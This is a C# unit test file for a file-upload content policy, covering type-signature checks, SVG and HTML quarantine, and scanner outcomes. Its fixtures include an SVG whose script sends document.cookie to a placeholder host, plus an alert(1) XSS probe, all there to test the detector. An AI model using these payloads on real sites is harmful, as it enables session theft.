using System.Text;
using AppTemplate.Application.Features.Files.Policies;
using AppTemplate.Application.Features.Files.Ports.FileContentInspector;
using AppTemplate.Domain.Features.Files.ValueObjects;
using Shouldly;
using Xunit;

namespace AppTemplate.Application.UnitTests.Features.Files.Policies;

/// <summary>
/// The decision half of the content inspection, exercised against real bytes. Every head below is
/// what the format actually starts with, not a stand-in — a test that fed the policy a made-up
/// signature would agree with a table that had the constants wrong.
/// </summary>
public sealed class StoredFileContentPolicyTests
{
    private static readonly byte[] _png = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00];
    private static readonly byte[] _jpeg = [0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10];
    private static readonly byte[] _gif = Encoding.ASCII.GetBytes("GIF89a....");
    private static readonly byte[] _pdf = Encoding.ASCII.GetBytes("%PDF-1.7\n%\xE2\xE3\xCF\xD3");
    private static readonly byte[] _zip = [(byte)'P', (byte)'K', 0x03, 0x04, 0x14, 0x00];
    private static readonly byte[] _csv = Encoding.ASCII.GetBytes("id,name,total\n1,widget,9.99\n");

    private static readonly byte[] _svg = Encoding.ASCII.GetBytes(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<svg xmlns=\"http://www.w3.org/2000/svg\">" +
        "<script>fetch('https://example.invalid/'+document.cookie)</script></svg>");

    #region The declared type against the content

    [Theory]
    [InlineData("image/png")]
    [InlineData("image/jpeg")]
    [InlineData("image/gif")]
    [InlineData("application/pdf")]
    public void ContentThatIsWhatItSaysItIs_IsReleased(string declared) =>
        Decide(declared, HeadFor(declared)).ShouldBe(ContentVerdict.Release);

    /// <summary>
    /// The claim, refused. This is the gap <c>SECURITY.md</c> names — "the declared media type is a
    /// claim, not a fact" — closed in the direction where the content names itself and names
    /// something else.
    /// </summary>
    [Fact]
    public void ContentThatNamesADifferentTypeThanWasDeclared_IsQuarantined() =>
        Decide("image/png", _jpeg).ShouldBe(ContentVerdict.Quarantine);

    /// <summary>
    /// The other direction, and the one that would otherwise be the way round it: the content matches
    /// no signature at all, but the declared type is one that always has one. A PNG that does not
    /// start like a PNG is not a PNG, whatever else it may be — an executable, an archive, a script.
    /// </summary>
    [Fact]
    public void ContentThatNamesNothing_IsQuarantinedWhenTheDeclaredTypeShouldHaveASignature() =>
        Decide("image/png", _csv).ShouldBe(ContentVerdict.Quarantine);

    /// <summary>
    /// The deliberate limit of what leading bytes can decide, asserted so that nobody mistakes it for
    /// a hole that was missed. CSV, JSON and plain text carry no signature, so a file declared as one
    /// of them cannot be checked this way and is released. What keeps that from being the evasion is
    /// the rule below it: the one format that is dangerous <em>because</em> it has no signature is
    /// recognised from its markup instead.
    /// </summary>
    [Fact]
    public void ContentDeclaredAsAFormatWithNoSignature_IsReleased() =>
        Decide("text/csv", _csv).ShouldBe(ContentVerdict.Release);

    /// <summary>
    /// A ZIP archive is what every Office document, every OpenDocument file and every EPUB starts
    /// like, so the table deliberately holds no entry for it. Reading <c>PK</c> as
    /// <c>application/zip</c> would refuse an honestly declared <c>.docx</c> — a real user's real
    /// file, refused by a rule that was meant to catch an attack.
    /// </summary>
    [Fact]
    public void AZipBasedDocumentFormat_IsNotRefusedForBeingAZip() =>
        Decide(
                "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                _zip)
            .ShouldBe(ContentVerdict.Release);

    /// <summary>
    /// And the archive dressed as an image is still refused, by the other direction of the rule —
    /// which is what makes leaving ZIP out of the table cost nothing.
    /// </summary>
    [Fact]
    public void AZipDeclaredAsAnImage_IsStillQuarantined() =>
        Decide("image/png", _zip).ShouldBe(ContentVerdict.Quarantine);

    /// <summary>
    /// No alias table, deliberately: a second place for the two sides to disagree. The consequence is
    /// stated as a test rather than left to be discovered — a client that spells JPEG the common
    /// wrong way is refused, and told to send the canonical type.
    /// </summary>
    [Fact]
    public void ANonCanonicalSpellingOfARecognisedType_IsRefused() =>
        Decide("image/jpg", _jpeg).ShouldBe(ContentVerdict.Quarantine);

    #endregion

    #region Script containers

    /// <summary>
    /// The gap <c>SECURITY.md</c> calls the one most likely to be exploited, closed. An SVG is a
    /// program: this one exfiltrates a cookie, and a browser that rendered it inline would run it.
    /// </summary>
    [Fact]
    public void AnSvgDeclaredAsAnImage_IsQuarantined() =>
        Decide("image/png", _svg).ShouldBe(ContentVerdict.Quarantine);

    /// <summary>
    /// <b>Even declared honestly.</b> Nothing in this template sanitises an SVG, and the download
    /// path cannot make one safe either — it hands out a signed URL to an origin this application
    /// does not control. Refusing the format is the only rule this layer can actually enforce, so it
    /// is enforced whatever the client called it.
    /// </summary>
    [Fact]
    public void AnHonestlyDeclaredSvg_IsQuarantinedToo() =>
        Decide("image/svg+xml", _svg).ShouldBe(ContentVerdict.Quarantine);

    [Theory]
    [InlineData("<!DOCTYPE html><html><body><script>alert(1)</script></body></html>")]
    [InlineData("<html><head><title>hello</title></head></html>")]
    [InlineData("   \n\n  <SVG xmlns=\"http://www.w3.org/2000/svg\"/>")]
    [InlineData("<?xml version=\"1.0\"?><!-- a comment long enough to push the markup along --><svg/>")]
    public void EveryShapeOfScriptContainer_IsQuarantined(string markup) =>
        Decide("text/plain", Encoding.ASCII.GetBytes(markup)).ShouldBe(ContentVerdict.Quarantine);

    /// <summary>
    /// The cheapest evasion there is, and the reason null bytes are dropped before the search. Encoded
    /// as UTF-16 an SVG is the same characters with a null between each; a browser renders it, and a
    /// search that did not drop them would see nothing.
    /// </summary>
    [Fact]
    public void AnSvgEncodedAsUtf16_IsStillRecognised()
    {
        byte[] utf16 = Encoding.Unicode.GetBytes("<svg xmlns=\"http://www.w3.org/2000/svg\"/>");

        Decide("text/plain", utf16).ShouldBe(ContentVerdict.Quarantine);
    }

    /// <summary>
    /// The false positive worth pinning, because the markup search runs over a whole kibibyte of
    /// prefix rather than at an offset: an ordinary document whose head happens to contain no markup
    /// must not be caught by it.
    /// </summary>
    [Fact]
    public void OrdinaryTextThatMentionsNoMarkup_IsNotMistakenForAScriptContainer() =>
        Decide("text/plain", Encoding.ASCII.GetBytes("Dear Sir, please find the invoice attached."))
            .ShouldBe(ContentVerdict.Release);

    #endregion

    #region The scanner's verdict

    [Fact]
    public void InfectedContent_IsQuarantined() =>
        StoredFileContentPolicy.Decide(
                DeclaredMediaType.Create("image/png"),
                new ContentInspectionOutcome(ContentInspectionStatus.Infected, _png, "Eicar-Test-Signature"))
            .ShouldBe(ContentVerdict.Quarantine);

    /// <summary>
    /// Content nothing will ever look at is refused rather than left waiting. The condition is
    /// permanent — the object is past a limit the object cannot change — so retrying would park the
    /// file for ever, and releasing it would make "upload something larger than the scanner accepts"
    /// the documented way to skip the scan.
    /// </summary>
    [Fact]
    public void ContentTheScannerRefusedToLookAt_IsQuarantined() =>
        StoredFileContentPolicy.Decide(
                DeclaredMediaType.Create("image/png"),
                new ContentInspectionOutcome(ContentInspectionStatus.NotInspectable, _png, null))
            .ShouldBe(ContentVerdict.Quarantine);

    /// <summary>
    /// <b>The arbitrage between fail-open and fail-closed, decided as neither.</b> No verdict is not
    /// a pass — that would serve unexamined content on the strength of somebody else's outage — and
    /// it is not a refusal either, which would destroy a user's upload for the same reason. The file
    /// stays where it is and is asked about again.
    /// </summary>
    [Fact]
    public void ContentThatCouldNotBeExaminedAtAll_IsRetriedRatherThanDecided() =>
        StoredFileContentPolicy.Decide(
                DeclaredMediaType.Create("image/png"),
                new ContentInspectionOutcome(
                    ContentInspectionStatus.Unavailable,
                    ReadOnlyMemory<byte>.Empty,
                    null))
            .ShouldBe(ContentVerdict.Retry);

    /// <summary>
    /// The order matters and this is what pins it: an outage is checked before anything else, so a
    /// head that happens to be empty — which is what an unavailable outcome carries — can never be
    /// read as content that failed the type check. Reversing the two would turn every scanner outage
    /// into a quarantined file.
    /// </summary>
    [Fact]
    public void AnOutageIsNeverMistakenForAFailedTypeCheck() =>
        StoredFileContentPolicy.Decide(
                DeclaredMediaType.Create("image/png"),
                new ContentInspectionOutcome(
                    ContentInspectionStatus.Unavailable,
                    ReadOnlyMemory<byte>.Empty,
                    null))
            .ShouldNotBe(ContentVerdict.Quarantine);

    #endregion

    #region Arguments

    [Fact]
    public void ANullArgument_IsRejected()
    {
        var clean = new ContentInspectionOutcome(ContentInspectionStatus.Clean, _png, null);

        Should.Throw<ArgumentNullException>(() => StoredFileContentPolicy.Decide(null!, clean));
        Should.Throw<ArgumentNullException>(
            () => StoredFileContentPolicy.Decide(DeclaredMediaType.Create("image/png"), null!));
    }

    #endregion

    private static ContentVerdict Decide(string declaredMediaType, ReadOnlyMemory<byte> head) =>
        StoredFileContentPolicy.Decide(
            DeclaredMediaType.Create(declaredMediaType),
            new ContentInspectionOutcome(ContentInspectionStatus.Clean, head, null));

    private static byte[] HeadFor(string mediaType) => mediaType switch
    {
        "image/png" => _png,
        "image/jpeg" => _jpeg,
        "image/gif" => _gif,
        "application/pdf" => _pdf,
        _ => throw new ArgumentOutOfRangeException(nameof(mediaType), mediaType, "No sample for that type."),
    };
}
